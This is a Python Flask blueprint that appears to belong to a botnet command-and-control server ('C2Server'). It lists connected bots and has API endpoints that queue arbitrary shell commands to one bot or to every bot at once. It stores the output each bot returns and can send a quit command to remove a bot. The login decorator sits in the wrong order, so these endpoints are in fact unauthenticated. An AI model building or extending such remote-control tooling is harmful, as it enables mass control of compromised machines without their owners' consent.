from flask import request, Blueprint, jsonify, render_template
from C2Server.threaded_server import getThreadNameAndIP, CMD_INPUT, CMD_OUTPUT, THREADS, IPS
from flask_login import login_required
from C2Server import OUTPUT_DIR

bots = Blueprint('bots', __name__)

@login_required
@bots.route("/bots/all")
def bots_page():
    return render_template("bots.html", bots=getThreadNameAndIP())

@login_required
@bots.route("/api/<thread_uuid>/execute_command", methods=["POST"])
def execute_command(thread_uuid):
    try:
        if request.method == "POST":
            data = request.get_json()
            command = data.get("command")
            CMD_INPUT[thread_uuid].put(command)
            response = CMD_OUTPUT[thread_uuid].get()
            with open(f"{OUTPUT_DIR}/{thread_uuid}.txt", "w") as f:
                f.write(response)
            return jsonify({"success" : "Command executed successfully"}), 200
        else:
            raise Exception("Invalid request method")
    except Exception as e:
        return jsonify({"error" : str(e)}), 400
    
@login_required
@bots.route("/api/<thread_uuid>/delete_bot", methods=["DELETE"])
def delete_bot(thread_uuid):
    try:
        if request.method == "DELETE":
            CMD_INPUT[thread_uuid].put("quit")
            response = CMD_OUTPUT[thread_uuid].get()
            with open(f"{OUTPUT_DIR}/{thread_uuid}.txt", "w") as f:
                f.write(response)
            return jsonify({"success" : "Bot deleted successfully"}), 200
        else:
            raise Exception("Invalid request method")
    except Exception as e:
        return jsonify({"error" : str(e)}), 400
    
@login_required
@bots.route("/api/execute_all", methods=["POST"])
def execute_all():
    try:
        if request.method == "POST":
            data = request.get_json()
            command = data.get("command")
            for thread_uuid in THREADS:
                CMD_INPUT[thread_uuid].put(command)
            for thread_uuid in THREADS:
                response = CMD_OUTPUT[thread_uuid].get()
                with open(f"{OUTPUT_DIR}/{thread_uuid}.txt", "w") as f:
                    f.write(response)
            return jsonify({"success" : "Command executed successfully"}), 200
        else:
            raise Exception("Invalid request method")
    except Exception as e:
        return jsonify({"error" : str(e)}), 400